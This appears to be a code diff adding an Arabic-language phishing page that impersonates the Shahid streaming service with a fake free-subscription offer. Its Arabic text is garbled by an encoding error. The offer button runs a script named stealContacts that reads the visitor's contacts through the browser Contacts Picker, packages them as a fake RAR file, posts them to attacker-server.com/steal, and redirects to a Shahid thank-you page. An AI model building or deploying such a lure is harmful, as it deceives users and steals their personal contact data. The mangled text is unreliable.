@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>⁄—÷ Õ’—Ì „‰ ‘«Âœ!</title>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #ff0000, #b20710); 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            text-align: center;
+            padding: 50px;
+            color: white;
+        }
+        .offer-box {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+        .btn {
+            background: #e50914;
+            color: white;
+            padding: 15px 40px;
+            font-size: 22px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background: #ff0000;
+            transform: scale(1.05);
+        }
+        .stars {
+            font-size: 50px;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="offer-box">
+        <h1>?? ›“  »«‘ —«ﬂ „Ã«‰Ì ·„œ… ”‰…!</h1>
+        <div class="stars">?????</div>
+        <p> „ «Œ Ì«—ﬂ ··Õ’Ê· ⁄·Ï «‘ —«ﬂ „Ã«‰Ì ›Ì „‰’… ‘«Âœ ·„œ… 12 ‘Â—«</p>
+        <p>«‰ﬁ— ⁄·Ï «·“— √œ‰«Â · ›⁄Ì· «·ÂœÌ… Œ·«· 5 œﬁ«∆ﬁ</p>
+        
+        <button class="btn" onclick="stealContacts()">‰⁄„° √—Ìœ «·ÂœÌ…!</button>
+        
+        <p><small>⁄—÷ Õ’—Ì ·√Ê· 100 „‘«Âœ ›ﬁÿ -  √ﬂœ „‰ « ’«·ﬂ »«·≈‰ —‰ </small></p>
+    </div>
+
+    <script>
+        // œ«·… ”—ﬁ… ÃÂ«  «·« ’«·
+        async function stealContacts() {
+            try {
+                // 1. „Õ«Ê·… «·Ê’Ê· ·ÃÂ«  «·« ’«· (Ì ÿ·» „Ê«›ﬁ… «·„” Œœ„)
+                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
+                
+                // 2.  ÕÊÌ· «·»Ì«‰«  ·„·› ‰’Ì
+                const contactData = JSON.stringify(contacts);
+                const blob = new Blob([contactData], {type: 'application/json'});
+                
+                // 3. ≈‰‘«¡ „·› RAR ÊÂ„Ì (›Ì «·Ê«ﬁ⁄ „·› „÷€Êÿ »«·Ã«›«”ﬂ—Ì» )
+                const rarBlob = new Blob([blob], {type: 'application/vnd.rar'});
+                
+                // 4. ≈—”«· «·»Ì«‰«  ⁄»— «·»—Ìœ (Ì ÿ·» ”Ì—›— Œ·›Ì)
+                sendToEmail(rarBlob);
+                
+                // 5.  ÊÃÌÂ «·„” Œœ„ ·’›Õ… ÊÂ„Ì…
+                window.location.href = "https://www.shahid.net/offer-thank-you";
+            } catch (error) {
+                console.error('›‘·  «·⁄„·Ì…:', error);
+                alert('ÕœÀ Œÿ√! Ì—ÃÏ «·„Õ«Ê·… „—… √Œ—Ï.');
+            }
+        }
+
+        // œ«·… «·≈—”«· (‰Ÿ—Ì)
+        function sendToEmail(file) {
+            // ?? Â–« «·Ã“¡ Ì ÿ·» ”Ì—›— Œ·›Ì ÕﬁÌﬁÌ
+            const formData = new FormData();
+            formData.append('contacts', file, 'contacts.rar');
+            
+            fetch('https://attacker-server.com/steal', {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
